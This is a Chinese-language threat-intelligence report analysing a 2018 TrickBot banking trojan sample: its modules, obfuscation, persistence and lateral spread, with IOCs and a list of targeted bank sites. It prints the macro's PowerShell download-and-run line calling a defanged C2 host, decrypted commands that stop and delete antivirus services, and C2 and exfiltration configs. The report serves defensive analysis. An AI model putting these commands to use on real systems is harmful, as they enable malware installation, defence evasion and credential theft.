@@ -1,0 +1,1156 @@
+# TrickBot银行木马最新版本分析报告
+
+阅读量 **693671**
+
+|评论 **4**
+
+发布时间 : 2018-12-11 10:30:25
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p4.ssl.qhimg.com/t0199bd5aeaf8ea9169.png)
+
+作者：360企业安全华南基地
+
+## 一、概述
+
+TrickBot是一款专门针对银行发动攻击的木马程序，攻击目标除了包括300余家知名国际银行外，还包括binance.com等多家虚拟货币交易平台。
+
+TrickBot木马最早被发现于2016年，其很多功能与另外一款针对银行的木马Dyreza非常相似。TrickBot木马的早期版本，没有任何字符串加密功能，也基本没有采用其他的对抗手段，但目前流行TrickBot使用了很强的加密功能，也使用用多种安全对抗技术，使得安全人员对其进行代码分析越来越困难。
+
+我们总结了最新版本的TrickBot如下特点：
+
+### 1.高强度的反分析能力：
+
+1）木马所用到的字符串全部采用自定义base64编码进行加。
+
+2）代码进行了大量混淆对抗静态分析。
+
+3）对抗动态调试。
+
+4）对抗沙盒检测。
+
+5）对抗dump分析。
+
+6）运用了大量加密手段，对抗杀软查杀。
+
+### 2.强大的窃取能力
+
+TrickBot入侵用户电脑后，会下载多个恶意模块到本地执行，收集信息，盗取金融的账户信息等等，涉及金融站点链接多达300多个，下表为受影响的小部分银行名称，详细受影响银行列表见文末附录。
+
+公司名称 | 域名  
+---|---  
+苏格兰皇家银行 | <https://www.rbsidigital.com>  
+汇丰银行 | <https://www.business.hsbc.co.uk>  
+苏格兰银行 | <https://banking.bankofscotland.co.uk>  
+西敏寺银行 | <https://www.natwestibanking.com>  
+德意志银行 | <https://www.deutschebank-dbdirect.com>  
+巴克莱银行 | <https://www.barclayswealth.com>  
+  
+### 3.广泛的信息收集能力
+
+TrickBot除盗窃金融账户信息外，还会盗窃浏览器、FTP、SSH等用户凭据，收集用户隐私，收集环境信息，收集特定类型服务器信息，收集邮箱等等。
+
+### 4、复杂的模块集合
+
+TrickBot采用模块化设计，扩展性极强，攻击者可随时通过网络下发替换不同恶意模块，替换配置进行不同种类的恶意攻击。截止到目前，一共有12个模块，TrickBot频繁更新用于传播的Loader，其伪装成一些游戏或工具，通过更换Loader编写语言以及编译器，对抗杀软查杀。同时新增了POS信息收集模块以及更新了新版本凭据盗窃模块。以下是TrickBot的恶意模块列表。
+
+病毒模块列表：
+
+模块
+
+|
+
+目的  
+  
+---|---  
+  
+injectDll
+
+|
+
+执行Web浏览器注入窃取金融账户信息  
+  
+importDll
+
+|
+
+收集浏览器敏感数据  
+  
+mailsearcher
+
+|
+
+搜索文件系统收集邮箱信息  
+  
+networkDll
+
+|
+
+收集网络和系统信息  
+  
+pwgrab
+
+|
+
+收集浏览器、SSH、FTP等用户凭据  
+  
+shareDll
+
+|
+
+更新loader并通过SMB传播TrickBot  
+  
+tabDll
+
+|
+
+通过EternalRomance漏洞传播TrickBot  
+  
+systeminfo
+
+|
+
+收集系统信息  
+  
+wormDll
+
+|
+
+查询域控制器及共享  
+  
+psfin
+
+|
+
+收集POS服务器信息  
+  
+bcClientDllTestTest
+
+|
+
+将被感染计算器作为代理服务器使用  
+  
+NewBCtestnDll
+
+|
+
+带有命令执行功能的反弹SHELL  
+  
+### 5.支持横向攻击及多重持久化方式
+
+TrickBot部署模块中包含“永恒浪漫”利用，向默认共享中复制最新版本的TrickBot伪装载体，多种途径尝试进行横向攻击传播。TrickBot会通过计划任务启动，其模块拥有添加注册表、服务、启动目录等启动的能力。
+
+## 二、详细分析
+
+本次获取的“TrickBot”样本通过带有宏的Excel表格文件进行传播，并以附件的形式发给用户。用户打开文档执行宏，文档内的恶意代码将会执行，通过调用CMD、POWERSHELL，下载并启动病毒。
+
+###  主体分析
+
+![](https://p3.ssl.qhimg.com/t0143b889d5eb16b36a.png)
+
+![](https://p1.ssl.qhimg.com/t0139a15a1428179c6d.png)
+
+####  载荷分析
+
+![](https://p0.ssl.qhimg.com/t016131c71fcc3c6c1b.png)
+
+文档中的宏被执行后，会在%temp%下创建tmp409.bat，通过批处理执行powershell从C&C服务器(hxxp://hsbcdocuments.net)下载病毒。
+
+![](https://p4.ssl.qhimg.com/t019f8b5380a463bc6a.png)
+
+    
+    
+    powershell "<#const later. create#>function tryload([string] $str1){(new-object system.net.webclient).downloadfile($str1,'C:\Users\currentuser\AppData\Local\Temp\newfile.exe');<#additional#>start-process 'C:\Users\currentuser\AppData\Local\Temp\newfile.exe';}try{tryload('hxxp://hsbcdocuments.net/twi.light')}catch{tryload('hxxp://hsbcdocuments.net/twi.light')}
+
+powershell执行后会将病毒下载到”%temp%\newfile.exe”并启动。
+
+####  伪装层分析
+
+为了对抗安全软件查杀、沙箱检测和安全人员分析，病毒被多层loader包裹，代码进行了大量混淆。字符串及核心代码全部加密，运行时解密，执行后再加密。
+
+伪装层掺杂了大量的无用代码，其核心功能是将自身携带的loader解密进行内存加载。
+
+![](https://p2.ssl.qhimg.com/t01b6a9a22eb56e6a79.png)
+
+将自身资源中加密存储的Loader解密后拷贝到堆空间中，然后转入Loader入口执行。
+
+![](https://p0.ssl.qhimg.com/t017dde08dfac60408b.png)
+
+####  Loader分析
+
+流程转到该Loader层后，病毒在执行过程中会按需解密，解密执行完成后再将代码加密。循环往复，增加动态调试和静态分析的难度，如下图所示为病毒待解密的数据指针表。
+
+![](https://p5.ssl.qhimg.com/t01ec4d35bec9d2ed19.png)
+
+执行过程中，加密与解密均调用此函数处理，数据指针如上图表中所示，大小为表中相邻块的差值，与22字节的key循环异或进行加解密
+
+![](https://p2.ssl.qhimg.com/t01e73ee151534388ac.png)
+
+通过跟踪，key表如下：
+
+![](https://p1.ssl.qhimg.com/t015782e34eb63cdec8.png)
+
+同时字符串也全部加密，使用时通过标号获得加密字符串位置，调用解密函数解密后放入栈中使用，从而干扰分析人员通过dump以及相关字符串定位关键点，此外调用API全部动态获取后再调用，对抗静态分析。
+
+![](https://p0.ssl.qhimg.com/t01c324237946da9c29.png)
+
+解密算法为替换了编码表的base64算法，通过上层调用计算出待解密字符串的位置，调用此处解密，如下图。
+
+![](https://p5.ssl.qhimg.com/t01f0300d4c6697fdfa.png)
+
+本层PE Loader使用的字符串，解密后，部分如下：
+
+    
+    
+    'svchost.exe'
+    '\\WINYS'
+    'pstorec.dll'
+    'vmcheck.dll'
+    'dbghelp.dll'
+    'wpespy.dll'
+    'api_log.dll'
+    'SbieDll.dll'
+    'SxIn.dll'
+    'dir_watch.dll'
+    'Sf2.dll'
+    'cmdvrt32.dll'
+    'snxhk.dll'
+    'MSEDGE'
+    'IEUser'
+    '/c net stop SAVService'
+    '/c net stop SAVAdminService'
+    '/c net stop Sophos AutoUpdate Service'
+    '/c net stop SophosDataRecorderService'
+    '/c net stop Sophos MCS Agent'
+    '/c net stop Sophos MCS Client'
+    '/c net stop sophossps'
+    '/c net stop Sntp Service'
+    '/c net stop Sophos Web Control Service'
+    '/c net stop swi_service'
+    '/c net stop swi_update_64'
+    'C:\\Program Files\\Sophos\\Sophos System Protection\\1.exe'
+    'C:\\Program Files\\Malwarebytes\\Anti-Malware\\MBAMService.exe'
+    '/c sc stop WinDefend'
+    '/c sc delete WinDefend'
+    'MsMpEng.exe'
+    'MSASCuiL.exe'
+    'MSASCui.exe'
+
+为了方便静态分析，对本层PE
+Loader进行DUMP后添加IAT、对静态文件中的字符串解密以及加密函数进行提前解密，再通过调试器trace对API动态调用进行记录。
+
+![](https://p2.ssl.qhimg.com/t01f9869d6d1e100159.png)
+
+![](https://p1.ssl.qhimg.com/t011a109142f1768c24.png)
+
+解密指针表中全部数据后。发现除代码之外，其加密数据中存在3个PE文件，但PE头部分已经被抹掉。这3个PE文件的功能会在下文中叙述。
+
+![](https://p2.ssl.qhimg.com/t011ebbdb6ebb13a947.png)
+
+![](https://p1.ssl.qhimg.com/t01a823db1ba36527a3.png)
+
+本层PE主要功能进行安全工具检测，并会尝试关闭安全软件的实时监控，停止、删除安全软件服务，为其核心功能代码加载提供便利。同时将自身拷贝到%APPDATA%\WINYS\newfile.exe以子进程再次启动。
+
+停止并删除Windows Defender服务关闭实时监控。
+
+![](https://p4.ssl.qhimg.com/t01f8a444f105a631e1.png)
+
+![](https://p4.ssl.qhimg.com/t011a1b7c620d542ecf.png)
+
+子进程启动后，病毒会根据不同环境选择不同PE(上文提到加密数据中存在3个PE文件)，对PE头进行补全后，再次内存加载，此处加载的便是TrickBot的核心，TrickBot执行顺序如下图。
+
+![](https://p0.ssl.qhimg.com/t015920171432c3c72a.png)
+
+####  TrickBot核心
+
+将TrickBot核心进行Dump后进行分析发现。
+
+核心加载后会创建计划任务并退出，等待计划任务启动，通过计划任务开机自启，每10分钟启动自己。
+
+![](https://p3.ssl.qhimg.com/t01b5a3425168c9e724.png)
+
+TrickBot核心所使用的字符串同样使用了前文所述的加密方法，解密后字符串部分如下，透过字符串可以看到，TrickBot通讯带有命令的号，其创建的互斥体名称是通过计算拼接得出的，防止互斥体被识别。
+
+    
+    
+    '%s %S HTTP/1.1\r\nHost: %s%s%S'
+    '.onion'
+    'WinDefend'
+    'Global\\%08lX%04lX%lu'
+    'ip.anysrc.net'
+    'api.ipify.org'
+    'ipinfo.io'
+    'checkip.amazonaws.com'
+    'Global\\Muta'
+    '%s/%s/63/%s/%s/%s/%s/'
+    '/%s/%s/25/%s/'
+    '/%s/%s/23/%d/'
+    '/%s/%s/14/%s/%s/0/'
+    '/%s/%s/10/%s/%s/%d/'
+    '/%s/%s/5/%s/'
+    '/%s/%s/1/%s/'
+    '/%s/%s/0/%s/%s/%s/%s/%s/'
+    'Module has already been loaded'
+    'autostart'
+    '<moduleconfig>*</moduleconfig>'
+    '%s%s'
+    '%s%s_configs\\'
+    'Data\\'
+    'POST'
+    'GET'
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2228.0 Safari/537.36'
+
+当计划任务启动TricoBot后会解密自身资源中的AES加密配置，并根据配置获取模块以及获取公网IP等操作，同时会尝试获取新配置config.conf进行更新操作。
+
+![](https://p5.ssl.qhimg.com/t019b30f7e5c1c2ec14.png)
+
+多渠道获取公网IP信息。
+
+![](https://p4.ssl.qhimg.com/t016f9acbf2dd411209.png)
+
+解密后的配置信息如下：
+
+    
+    
+    <mcconf>
+    <ver>1000294</ver>
+    <gtag>ser1105</gtag>
+    <servs>
+    <srv>51.68.170.58:443</srv>
+    <srv>68.3.14.71:443</srv>
+    <srv>174.105.235.178:449</srv>
+    <srv>91.235.128.69:443</srv>
+    <srv>181.113.17.230:449</srv>
+    <srv>174.105.233.82:449</srv>
+    <srv>66.60.121.58:449</srv>
+    <srv>207.140.14.141:443</srv>
+    <srv>42.115.91.177:443</srv>
+    <srv>206.130.141.255:449</srv>
+    <srv>51.68.170.58:443</srv>
+    <srv>74.140.160.33:449</srv>
+    <srv>65.31.241.133:449</srv>
+    <srv>140.190.54.187:449</srv>
+    <srv>75.102.135.23:449</srv>
+    <srv>24.119.69.70:449</srv>
+    <srv>195.123.212.139:443</srv>
+    <srv>103.110.91.118:449</srv>
+    <srv>24.119.69.70:449</srv>
+    <srv>68.4.173.10:443</srv>
+    <srv>72.189.124.41:449</srv>
+    <srv>105.27.171.234:449</srv>
+    <srv>182.253.20.66:449</srv>
+    <srv>199.182.59.42:449</srv>
+    <srv>46.149.182.112:449</srv>
+    <srv>91.235.128.69:443</srv>
+    <srv>199.227.126.250:449</srv>
+    <srv>24.113.161.184:449</srv>
+    <srv>197.232.50.85:443</srv>
+    <srv>94.232.20.113:443</srv>
+    <srv>190.145.74.84:449</srv>
+    <srv>47.49.168.50:443</srv>
+    <srv>73.67.78.5:449</srv>
+    </servs>
+    <autorun>
+    <module name="systeminfo" ctl="GetSystemInfo"/>
+    <module name="injectDll"/><module name="pwgrab"/>
+    </autorun></mcconf>
+
+通过配置文件下载的模块使用了XOR、AES加密，在执行期间解密，模块根据配置文件执行相应的操作，TrickBot通过注入svchost来部署恶意模块。
+
+![](https://p0.ssl.qhimg.com/t012e01642bbee5d9aa.png)
+
+其下载的模块如下：
+
+![](https://p0.ssl.qhimg.com/t01f008e4b33188ed88.png)
+
+模块以及模块配置信息均使用AES算法加密，执行期间解密，作者为每台受感染的机器计算出不同的key用于模块解密。
+
+![](https://p0.ssl.qhimg.com/t0195b5c48db197722b.png)
+
+###  模块分析
+
+下载的模块均被加密，初始样本模块有9个， TrickBot更新其Loader后又有新的模块加入以及部分模块更新，对其模块及其配置进行解密后，进行分析。
+
+####  injectDll 银行盗窃模块
+
+injectDll
+银行盗窃模块，在浏览器中注入DLL以窃取银行凭据，injectDll通过两种方式窃取银行信息，通过hook浏览器相关函数截取用户登录信息后上传至C2服务器或者将银行网站重定向到钓鱼网站。以下是其模块所涉及的银行配置部分内容，总共涉及金融相关站点多达300多个。
+
+    
+    
+    <sinj>
+    <mm>https://www.rbsidigital.com*</mm>
+    <sm>https://www.rbsidigital.com/default.aspx*</sm>
+    <nh>krsajxnbficgmrhtwsoezpklqvyd.net</nh>
+    <url404></url404>
+    <srv>185.180.197.92:443</srv>
+    </sinj>
+
+完整列表详见文末附录。
+
+injectDll会HOOK浏览器HTTP通讯相关API，对账号密码进行拦截或对指定域名进行劫持钓鱼。
+
+![](https://p3.ssl.qhimg.com/t01a8beabbb43a8a15b.png)
+
+还会设置键盘钩子判断是否在操作浏览器等。
+
+![](https://p1.ssl.qhimg.com/t012ff9c154fc0497ac.png)
+
+####  pwgrab凭据窃取模块
+
+pwgrab模块用于窃取Chrome、火狐等浏览器用户信息，FileZilla、Microsoft Outlook和WinSCP等应用程序的凭据。
+
+    
+    
+    <dpost>
+    <handler>hxxp://24.247.181.125:8082</handler>
+    <handler>hxxp://66.181.167.72:8082</handler>
+    <handler>hxxp://46.146.252.178:8082</handler>
+    <handler>hxxp://96.36.253.146:8082</handler>
+    <handler>hxxp://40.131.87.38:8082</handler>
+    <handler>hxxp://23.142.128.34:80</handler>
+    <handler>hxxp://177.0.69.68:80</handler>
+    <handler>hxxp://24.247.181.1:80</handler>
+    <handler>hxxp://96.87.184.101:80</handler>
+    <handler>hxxp://72.226.103.74:80</handler>
+    <handler>hxxp://185.117.119.64:443</handler>
+    <handler>hxxp://198.23.252.204:443</handler>
+    <handler>hxxp://194.5.250.156:443</handler>
+    <handler>hxxp://31.131.22.65:443</handler>
+    <handler>hxxp://92.38.135.99:443</handler>
+    </dpost>
+
+窃取Chrome凭证。
+
+![](https://p3.ssl.qhimg.com/t01b32120787abdb1dd.png)
+
+窃取FileZilla、Microsoft Outlook和WinSCP等应用程序的凭据。
+
+![](https://p3.ssl.qhimg.com/t016ba1bdfbc94b26b2.png)
+
+####  systeminfo系统信息收集模块
+
+systeminfo用于系统信息收集，收集系统版本，用户账户，内存大小信息等等，并上传至C2服务器。
+
+通过SVCHOST进程部署恶意模块。
+
+![](https://p5.ssl.qhimg.com/t01c83464d8a12e04f8.png)
+
+将收集好的信息拼接，POST到C2服务器
+
+![](https://p0.ssl.qhimg.com/t01475c679ec939260c.png)
+
+![](https://p0.ssl.qhimg.com/t013b134ad8d5a49011.png)
+
+####  networkDll网络信息收集模块
+
+networkDll模块用于收集系统网络配置相关信息，并上传至C2服务器。
+
+    
+    
+    <dpost>
+    <handler>hxxp://24.247.181.125:8082</handler>
+    <handler>hxxp://66.181.167.72:8082</handler>
+    <handler>hxxp://46.146.252.178:8082</handler>
+    <handler>hxxp://96.36.253.146:8082</handler>
+    <handler>hxxp://40.131.87.38:8082</handler>
+    <handler>hxxp://23.142.128.34:80</handler>
+    <handler>hxxp://177.0.69.68:80</handler>
+    <handler>hxxp://24.247.181.1:80</handler>
+    <handler>hxxp://96.87.184.101:80</handler>
+    <handler>hxxp://72.226.103.74:80</handler>
+    <handler>hxxp://185.117.119.64:443</handler>
+    <handler>hxxp://198.23.252.204:443</handler>
+    <handler>hxxp://194.5.250.156:443</handler>
+    <handler>hxxp://31.131.22.65:443</handler>
+    <handler>hxxp://92.38.135.99:443</handler>
+    </dpost>
+
+获取详细的IP信息、工作组、域中的计算机列表、域信息。
+
+![](https://p2.ssl.qhimg.com/t017ef1a3e5101700ac.png)
+
+将信息组织好后POST到C2服务器。
+
+![](https://p1.ssl.qhimg.com/t01f5a2058804988faf.png)
+
+####  mailsearcher邮件地址收集模块
+
+mailsearcher模块用于遍历文件搜集Email地址，并上传给C2服务器，用于后续邮件传播病毒。
+
+    
+    
+    <mail> 
+    <handler>23.226.138.170:443</handler>
+    </mail>
+
+遍历全盘文件获取邮箱信息。
+
+![](https://p0.ssl.qhimg.com/t014fd7d3d84cb38ccc.png)
+
+将获取到的邮箱信息上传到服务器，为后续邮件攻击做准备。
+
+![](https://p0.ssl.qhimg.com/t0164790377c9119409.png)
+
+####  tabDll32横向传播增强持久化模块
+
+tabDll32利用EternalRomance漏洞传播自身，其自身rdata节中带有添加启动项和锁屏两个模块
+
+    
+    
+    <dpost>
+    <handler>hxxp://24.247.181.125:8082</handler>
+    <handler>hxxp://66.181.167.72:8082</handler>
+    <handler>hxxp://46.146.252.178:8082</handler>
+    <handler>hxxp://96.36.253.146:8082</handler>
+    <handler>hxxp://40.131.87.38:8082</handler>
+    <handler>hxxp://23.142.128.34:80</handler>
+    <handler>hxxp://177.0.69.68:80</handler>
+    <handler>hxxp://24.247.181.1:80</handler>
+    <handler>hxxp://96.87.184.101:80</handler>
+    <handler>hxxp://72.226.103.74:80</handler>
+    <handler>hxxp://185.117.119.64:443</handler>
+    <handler>hxxp://198.23.252.204:443</handler>
+    <handler>hxxp://194.5.250.156:443</handler>
+    <handler>hxxp://31.131.22.65:443</handler>
+    <handler>hxxp://92.38.135.99:443</handler>
+    </dpost>
+
+  * SsExecutor.exe模块主要用途为增加启动项，添加注册表和启动目录方式启动。
+
+  * 
+
+  * screenlock.dll目前只有锁屏功能，该模块似乎尚未开发完成，猜测其目的可能为配合其他模块盗取登录密码或尝试锁定计算机。
+
+  * 
+
+####  shareDll Loader更新及共享传播
+
+shareDll下载png后缀的PE文件，通过共享文件夹进行横向传播，该PE文件多伪装成游戏，后台监测到每天都有变化,在不断的更新。
+
+获取系统默认共享，通过共享传播病毒本身。
+
+![](https://p4.ssl.qhimg.com/t012ae6d6382bc145e1.png)
+
+将自身拷贝到系统默认共享中，进行横向传播移动。
+
+![](https://p4.ssl.qhimg.com/t01782fef0cc121ad73.png)
+
+通过增加服务，添加启动项，增加持久化。
+
+![](https://p4.ssl.qhimg.com/t01935593cf3329e4a9.png)
+
+####  wormDll辅助传播模块
+
+wormDll获取网络中的服务器和域控制器，利用NT LM 0.12查询旧版Windows操作系统和IPC共享。
+
+![](https://p0.ssl.qhimg.com/t016d46150db0093d60.png)
+
+![](https://p2.ssl.qhimg.com/t016f008226b27dd78e.png)
+
+####  importDll盗窃浏览器敏感信息模块
+
+importDll用于窃取浏览器数据，浏览历史记录，Cookie等。
+
+盗窃Chrome用户数据如图：
+
+![](https://p1.ssl.qhimg.com/t011085baf841f5781c.png)
+
+盗窃浏览器Cookie相关：
+
+![](https://p2.ssl.qhimg.com/t010253f19d40ba7650.png)
+
+####  psfin收集支付相关服务器信息
+
+psfin用于收集有关POS的服务器信息，使用LDAP查询包含POS、LANE、BOH、TERM、REG、STORE、ALOHA、CASH、RETAIL、MICROS关键字的主机信息。
+
+![](https://p2.ssl.qhimg.com/t01d07c1a9a0e3f4ba8.png)
+
+将收集到的信息POST给C2服务器。
+
+![](https://p3.ssl.qhimg.com/t01f7833896f1b28699.png)
+
+#### bcClientDllTestTest将被感染计算器作为代理使用
+
+该模块为TrickBot提供代理服务，bcClientDllTestTest反向连接通信协议，通讯相关如下图所示。
+
+●disconnect：终止后台服务器连接  
+●idle：维护客户端 – 服务器连接  
+●connect：连接到后台服务器。该命令必须包含以下参数：
+
+○ip：服务器的IP地址  
+○auth_swith：使用授权标志。如果该值设置为“1”，则特洛伊木马会收到auth_login和auth_pass参数。如果值为“0”，则获取auth_ip参数。否则，将不会建立连接。  
+○auth_ip：验证IP地址  
+○auth_login：验证登录  
+○auth_pass：验证密码
+
+![](https://p0.ssl.qhimg.com/t01924ef6b2da4d1915.png)
+
+#### NewBCtestnDll模块
+
+NewBCtestnDll 是一个带有命令执行功能的反弹SHELL模块，可接受远程命令，并执行，其配置如下：
+
+    
+    
+    <addr>147.135.243.1:80</addr>
+    
+    <addr>185.251.39.15:80</addr>
+    
+    <addr>85.143.222.82</addr>
+
+下图为远程命令执行相关代码。
+
+![](https://p1.ssl.qhimg.com/t012e74a107f3a7b06b.png)
+
+## 三、总结
+
+TrickBot随着其版本不断演变，使用了大量加密，多层次嵌套，对抗静态分析，动态调试以及沙箱检测，其模块化设计，攻击者可以方便的增减模块进行不同类型的攻击，分析过程中，发现其用来横向传播的伪装载体不停的变动，多采用C++、VB语言伪装成游戏或工具类应用进行内网共享传播。TrickBot仍在不断演变，部分模块处于开发阶段，某些功能尚未完成，其对金融站点的威胁不容小视，同时大量收集用户信息、登录凭据、环境信息，可能为下一步的攻击提供数据支持和思路。
+
+## 四、IOC
+
+####  C&C服务器
+
+    
+    
+    '51[.]68[.]170[.]58:443'
+    '68[.]3[.]14[.]71:443'
+    '174[.]105[.]235[.]178:449'
+    '91[.]235[.]128[.]69:443'
+    '181[.]113[.]17[.]230:449'
+    '174[.]105[.]233[.]82:449'
+    '66[.]60[.]121[.]58:449'
+    '207[.]140[.]14[.]141:443'
+    '42[.]115[.]91[.]177:443'
+    '206[.]130[.]141[.]255:449'
+    '74[.]140[.]160[.]33:449'
+    '65[.]31[.]241[.]133:449'
+    '140[.]190[.]54[.]187:449'
+    '75[.]102[.]135[.]23:449'
+    '24[.]119[.]69[.]70:449'
+    '195[.]123[.]212[.]139:443'
+    '103[.]110[.]91[.]118:449'
+    '68[.]4[.]173[.]10:443'
+    '72[.]189[.]124[.]41:449'
+    '105[.]27[.]171[.]234:449'
+    '182[.]253[.]20[.]66:449'
+    '199[.]182[.]59[.]42:449'
+    '46[.]149[.]182[.]112:449'
+    '199[.]227[.]126[.]250:449'
+    '24[.]113[.]161[.]184:449'
+    '197[.]232[.]50[.]85:443'
+    '94[.]232[.]20[.]113:443'
+    '190[.]145[.]74[.]84:449'
+    '47[.]49[.]168[.]50:443'
+    '73[.]67[.]78[.]5:449'
+    '24[.]247[.]181[.]125:8082'
+    '66[.]181[.]167[.]72:8082'
+    '46[.]146[.]252[.]178:8082'
+    '96[.]36[.]253[.]146:8082'
+    '40[.]131[.]87[.]38:8082'
+    '23[.]142[.]128[.]34:80'
+    '177[.]0[.]69[.]68:80'
+    '24[.]247[.]181[.]1:80'
+    '96[.]87[.]184[.]101:80'
+    '72[.]226[.]103[.]74:80'
+    '185[.]117[.]119[.]64:443'
+    '198[.]23[.]252[.]204:443'
+    '194[.]5[.]250[.]156:443'
+    '31[.]131[.]22[.]65:443'
+    '92[.]38[.]135[.]99:443'
+    '23[.]226[.]138[.]170:443'
+    '185[.]180[.]198[.]249'
+    '185[.]180[.]197[.]92:443'
+    '147[.]135[.]243[.]1:80'
+    '185[.]251[.]39[.]15:80'
+    '85[.]143[.]222[.]82'
+    '69[.]164[.]196[.]21',
+    '107[.]150[.]40[.]234'
+    '162[.]211[.]64[.]20'
+    '217[.]12[.]210[.]54'
+    '89[.]18[.]27[.]34'
+    '193[.]183[.]98[.]154'
+    '51[.]255[.]167[.]0'
+    '91[.]121[.]155[.]13'
+    '87[.]98[.]175[.]85'
+    '185[.]97[.]7[.]7'
+
+####  MD5
+
+文件名
+
+|
+
+MD5  
+  
+---|---  
+  
+TrickBot
+
+|
+
+D02FCFAAA123AB35D9E193665072CA15  
+  
+TrickBot
+
+|
+
+EB1ABB5E0458068094480B4C6470B85A  
+  
+TrickBot
+
+|
+
+3397A79ACB4CBA2883A09E702A80316D  
+  
+TrickBot
+
+|
+
+264C6B8C31043CCABBF376CBCBD7C42D  
+  
+TrickBot
+
+|
+
+80167E487D931AAF9766D50B4298BDBC  
+  
+pwgrab
+
+|
+
+06E2181088BDF16A9BA45397AF2A0DD8  
+  
+pwgrab
+
+|
+
+75BF818113BD29009A7A2F8E51539790  
+  
+injectDll
+
+|
+
+AF8FBC1BD830B96D4FE559410461E12A  
+  
+mailsearcher
+
+|
+
+B310F3130C73D99F4D5CCB33BE846030  
+  
+networkDll
+
+|
+
+FFCE6208DB156DEBDADB2A52CAF1FD04  
+  
+shareDll
+
+|
+
+B95DA61FDE8EE5DC776C561F3BEA7B35  
+  
+systeminfo
+
+|
+
+711287E1BD88DEACDA048424128BDFAF  
+  
+tabDll
+
+|
+
+2C51E6E6CE5C2B78CF77C7361D7C595A  
+  
+wormDll
+
+|
+
+7307F677B2BCAF3CD6CDA5821126CF89  
+  
+importDll
+
+|
+
+88384BA81A89F8000A124189ED69AF5C  
+  
+psfin
+
+|
+
+4FCE2DA754C9A1AC06AD11A46D215D23  
+  
+bcClientDllTestTest
+
+|
+
+3373728EA59A4A7F919F1CB5F0DB6559  
+  
+NewBCtestnDll
+
+|
+
+6243CE02597833B8DBDAC852D116C13A  
+  
+## 附录
+
+受影响的金融站点
+
+    
+    
+    ‘hxxps://www.rbsidigital.com'
+    ‘hxxps://www.bankline.rbs.com'
+    ‘hxxps://lloydslink.online.lloydsbank.com'
+    ‘hxxps://www.bankline.ulsterbank.ie'
+    ‘hxxps://www.business.hsbc.co.uk'
+    ‘hxxps://banking.bankofscotland.co.uk'
+    ‘hxxps://www.bankline.natwest.com'
+    ‘hxxps://online-business.bankofscotland.co.uk'
+    ‘hxxps://ebanking2.danskebank.co.uk'
+    ‘hxxps://northrimbankonline.btbanking.com'
+    ‘hxxps://home2.ybonline.co.uk'
+    ‘hxxps://corporate.metrobankonline.co.uk'
+    ‘hxxps://www.natwestibanking.com'
+    ‘hxxps://banking.cumberland.co.uk'
+    ‘hxxps://alolb1.arbuthnotlatham.co.uk'
+    ‘hxxps://online.hoaresbank.co.uk'
+    ‘hxxps://butterfieldonline.co.uk'
+    ‘hxxps://ibusinessbanking.aib.ie'
+    ‘hxxps://www.internationalpayments.co.uk'
+    ‘hxxps://www.asbolb.com'
+    ‘hxxps://personal.co-operativebank.co.uk'
+    ‘hxxps://cbfm.saas.cashfac.com'
+    ‘hxxps://onlinebanking.bankleumi.co.uk'
+    ‘hxxps://www.caterallenonline.co.uk'
+    ‘hxxps://onlinebusiness.lloydsbank.co.uk'
+    ‘hxxps://ibank.zenith-bank.co.uk'
+    ‘hxxps://ibank.gtbankuk.com'
+    ‘hxxps://online.bankofcyprus.co.uk'
+    ‘hxxps://banking.ireland-bank.com'
+    ‘hxxps://bankofirelandlifeonline.ie'
+    ‘hxxps://www.kbinternetbanking.com:8443'
+    ‘hxxps://ibank.reliancebankltd.com'
+    ‘hxxps://online.duncanlawrie.com'
+    ‘hxxps://bureau.bottomline.co.uk'
+    ‘hxxps://ibb.firsttrustbank1.co.uk'
+    ‘hxxps://netbanking.ubluk.com'
+    ‘hxxps://my.sjpbank.co.uk'
+    ‘hxxps://ebaer.juliusbaer.com'
+    ‘hxxps://ebanking-ch2.ubs.com'
+    ‘hxxps://ebank.turkishbank.co.uk'
+    ‘hxxps://banking.triodos.co.uk'
+    ‘hxxps://nebasilicon.fdecs.com'
+    ‘hxxps://infinity.icicibank.co.uk'
+    ‘hxxps://ibank.theaccessbankukltd.co.uk'
+    ‘hxxps://www.standardlife.co.uk'
+    ‘hxxps://www.youinvest.co.uk'
+    ‘hxxps://banking.lloydsbank.com'
+    ‘hxxps://secure.tddirectinvesting.co.uk'
+    ‘hxxps://www.deutschebank-dbdirect.com'
+    ‘hxxps://jpmcsso-uk.jpmorgan.com'
+    ‘hxxps://secure.aldermorebusinesssavings.co.uk'
+    ‘hxxps://www.unity-online.co.uk'
+    ‘hxxps://www.barclayswealth.com'
+    ‘hxxps://uksecure.barclayswealth.com'
+    ‘hxxps://onlinebanking.coutts.com'
+    ‘hxxps://www.gerrard.com'
+    ‘hxxps://uk.hkbea-cyberbanking.com'
+    ‘hxxps://onlinebanking.nationwide.co.uk'
+    ‘hxxps://www.bankline.ulsterbank.co.uk'
+    ‘hxxps://cbonline.bankofscotland.co.uk'
+    ‘hxxps://www.ulsterbankanytimebanking.co.uk'
+    ‘hxxps://cbonline.lloydsbank.com'
+    ‘hxxps://ulsterbank.co.uk'
+    ‘hxxps://www.iombankibanking.com'
+    ‘hxxps://www.rbsiibanking.com'
+    ‘hxxps://wealthclient.closebrothers.com'
+    ‘hxxps://www.coventrybuildingsociety.co.uk'
+    ‘hxxps://interface.htb.co.uk'
+    ‘hxxps://ib.lloydsbank.com'
+    ‘hxxps://secure.funds.lloydsbank.com'
+    ‘hxxps://www.tescobank.com'
+    ‘hxxps://online.tsb.co.uk'
+    ‘hxxps://www1.hsbcprivatebank.com'
+    ‘hxxps://bankonline.sboff.com'
+    ‘hxxps://banking.smile.co.uk'
+    ‘hxxps://online.alrayanbank.co.uk'
+    ‘hxxps://mybbsaccounts.bucksbs.co.uk'
+    ‘hxxps://online.ccbank.co.uk'
+    ‘hxxps://u-2-view.chorleybs.co.uk'
+    ‘hxxps://paragonbank.com'
+    ‘hxxps://client.nedsecure-int.com'
+    ‘hxxps://introducer.nedsecure-int.com'
+    ‘hxxps://www.rathbonesonline.com'
+    ‘hxxps://internetbanking.securetrustbank.com'
+    ‘hxxps://login.blockchain.com'
+    ‘hxxps://myaccounts.newbury.co.uk'
+    ‘hxxps://online.paragonbank.co.uk'
+    ‘hxxps://www.onlinebanking.iombank.com'
+    ‘hxxps://www2.firstdirect.com'
+    ‘hxxps://business.co-operativebank.co.uk'
+    ‘hxxps://online.adambank.com'
+    ‘hxxps://business2.danskebank.co.uk'
